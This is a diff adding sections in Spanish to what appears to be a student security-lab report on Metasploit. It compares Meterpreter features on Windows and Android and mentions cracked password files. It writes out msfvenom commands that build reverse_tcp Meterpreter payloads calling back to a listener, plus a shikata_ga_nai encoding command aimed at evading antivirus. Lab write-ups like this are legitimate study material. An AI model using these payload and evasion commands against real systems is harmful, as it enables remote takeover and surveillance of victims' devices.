@@ -132,6 +132,10 @@ Principalmente el uso de contraseñas seguras (compuestas tanto por caracteres m
 
 Una acción de concientización interesante podría ser la demostración de qué tan fácil puede llegar a ser descubrir una contraseña habitual, mediante el uso de diccionarios y/o fuerza bruta.
 
+\section{Seguridad física}
+
+Para evidenciar la realización de los laboratorios sobre seguridad física, tanto el de obtener los usuarios y contraseñas de un sistema Linux como de un Windows, se anexan los archivos \dq{cracked\_shadow.txt} y \dq{cracked\_windows.csv} dentro del directorio \dq{assets}.
+
 \section{Ataques}
 
 \subsection{Android}
@@ -209,6 +213,62 @@ Primero, se debe armar el PDF. Para ello, se necesita un archivo PDF de entrada,
 \end{itemize}
 
 Creado el archivo, es cuestión de abrir en la máquina objetivo y configurar una máquina a la cual se conectará la primera (el procedimiento es el mismo a la vulnerabilidad anterior).
+
+\subsection{\emph{Meterpreter} en Windows y en Android}
+
+\emph{¿Qué capacidades tiene Meterpreter en Windows que no están presentes en Android?} 
+
+Desde la consola de \emph{meterpreter} se puede ejecutar el comando \texttt{help} ó \texttt{?} para listar todos los comandos disponibles a ejecutar en el dispositivo objetivo - en el directorio \dq{assets} se incluyen dos archivos (\dq{meterpreter\_android.txt} y \dq{meterpreter\_windows.txt}) con los distintos comandos disponibles para cada plataforma).
+
+La principal diferencia que se puede ver examinando rápidamente la salida del comando de ayuda en cada plataforma es la posibilidad de gestionar procesos que se puede hacer en Windows pero no en Android; se pueden crear, eliminar (hasta se puede eliminar el proceso que tiene establecida la conexión). También permite ejecutar varios comandos a nivel de sistema, como puede ser recuperar variables de ambiente, obtener PIDs, reiniciar o apagar la computadora. Con respecto a la administración de redes, en la plataforma Windows se pueden examinar las conexiones abiertas con el comando \texttt{netstat}, el cual no está disponible para Android.  También se puede poner a correr un \emph{keylogger} \footnote{programas que realizan un seguimiento y registran cada tecla que se pulsa en una computadora \autocite{KasperskyKeylogger}}, para obtener las secuencias de teclas pulsadas por el usuario. 
+
+Por último, se puede tomar una captura de pantalla del escritorio activo o cambiar parámetros del mismo.
+
+\subsection{Analizando los archivos con \emph{VirusTotal}}
+
+A continuación se indica el comando que se utilizó para generar el archivo con el payload y la salida que se obtuvo al analizarlo con \href{http://www.virustotal.com/#/home/upload}{VirusTotal} 
+
+\begin{lstlisting}[title={Aplicación para Android}]
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.5 LPORT=12345 -o ~/app.apk
+\end{lstlisting}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=\linewidth]{virustotal_android}
+    \caption{Salida de VirusTotal para la aplicación de Android}
+\end{figure}
+
+\begin{lstlisting}[title={Aplicación para Windows}]
+    msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.0.5 LPORT=12345 -o ~/app.exe
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\linewidth]{virustotal_windows}
+    \caption{Salida de VirusTotal para la aplicación de Windows}
+\end{figure}
+
+\subsection{Evadir antivirus}
+
+\emph{¿Qué herramienta(s) provee metasploit para evadir la detección que se realizó en el punto 5?} 
+
+Una herramienta que brinda el \emph{framework} viene incluida (en las últimas versiones de \emph{metasploit}) en la aplicación \texttt{msfvenom} - esta es la posibilidad de \textbf{codificar la firma del virus}.
+
+Una de las técnicas que implementan los antivirus para reconocer archivos maliciosos es el reconocimiento de sus "firmas". Mayromente, verifican las primeras líneas del archivo en busca de algún patrón ya conocido de un cierto tipo de virus. Así que una forma sencilla de sortear los antivirus consiste en cambiar la codificación del archivo (sin cambiar su funcionalidad) para que no pase desapercibido \autocite{Signatures}.
+
+Para replicar el virus de Windows anterior pero con la firma codificada, se debe ejectuar el siguiente comando:
+
+\begin{lstlisting}
+    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b "\x00" -i 50 --platform windows -a x86 -f exe LHOST=<IP> LPORT=<PUERT\_DE\_ESCUCHA> -o indetectable.exe
+\end{lstlisting}
+
+En este caso, la codificación utilizada es la \dq{Shikata Ga Nai} (que se puede traducir al español como \dq{No se puede hacer nada al respecto} \autocite{Signatures}) - transforma la firma del \emph{payload} haciendo operaciones XOR acumulativas sobre la misma. No es perfecta, pero es eficiente y genera varias firmas rápidamente que luego pueden ser desencriptadas al momento de ejecutarse en la máquina objetivo. En el ejemplo de ejecución, la operación XOR se realiza 50 veces.
+
+Probando el nuevo archivo en VirusTotal, lamentablemente no se logró ninguna mejora, la cantidad de antivirus que reconocen el archivo como una amenaza sigue siendo la misma.
+
+Otra herramienta disponible para encriptar el \emph{payload} del virus y así ser menos reconocible, es \href{https://sourceforge.net/projects/crisp-shellcode-generator/files/}{VENOM} \autocite{VENOM}. Esta herramienta se vale del programa \texttt{msfvenom} para generar \emph{shellcode} en distintos formatos (como puede ser en C, Python, Ruby), y luego inyectarlo en una función de alguno de los lenguajes de programación (en un archivo \dq{plantilla})  
+
+
 
 
 
